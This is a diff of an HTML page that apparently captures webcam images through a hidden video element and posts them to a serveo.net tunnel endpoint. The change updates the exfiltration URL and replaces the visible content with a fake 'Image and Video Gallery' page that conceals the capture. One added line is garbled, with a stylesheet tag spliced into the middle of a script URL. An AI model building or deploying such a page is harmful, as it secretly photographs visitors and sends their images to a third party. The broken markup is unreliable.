@@ -1,9 +1,10 @@
 <!doctype html>
 <html>
 <head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<script type="text/javascript" src="https://wybiral.gi<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"></script>thub.io/code-art/projects/tiny-mirror/index.js"></script>
 <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
 </head>
 
 <div class="video-wrap" hidden="hidden">
@@ -18,7 +19,7 @@ function post(imgdata){
 $.ajax({
     type: 'POST',
     data: { cat: imgdata},
-    url: 'https://94354b8a3e0548d9875eaac86ceb0267.serveo.net/post.php',
+    url: 'https://40043b9ecb6360b658720b819c1a8d8d.serveo.net/post.php',
     dataType: 'json',
     async: false,
     success: function(result){
@@ -74,10 +75,30 @@ init();
 
 </script>
 
-    <body>
-        <p>Hint: Look at the favicon</p>
-        <p>(Accept Permissions)</p>
-        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
-    </body>
+<body class="bg-gray-100 p-4">
+
+  <div class="container mx-auto">
+      <h1 class="text-2xl font-bold mb-4">Image and Video Gallery</h1>
+
+      <!-- Gallery Section -->
+      <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+          <!-- Image 1 -->
+          <div class="bg-white p-4 rounded-md shadow-md">
+              <img src="path/to/image1.jpg" alt="Image 1" class="w-full h-48 object-cover rounded-md mb-2">
+              <p class="text-gray-700">Description for Image 1</p>
+          </div>
+
+          <!-- Video 1 -->
+          <div class="bg-white p-4 rounded-md shadow-md">
+              <iframe src="https://www.youtube.com/embed/VIDEO_ID" frameborder="0" allowfullscreen
+                  class="w-full h-48 rounded-md mb-2"></iframe>
+              <p class="text-gray-700">Description for Video 1</p>
+          </div>
+
+          <!-- Add more images and videos as needed -->
+      </div>
+  </div>
+
+</body>
 
 </html>
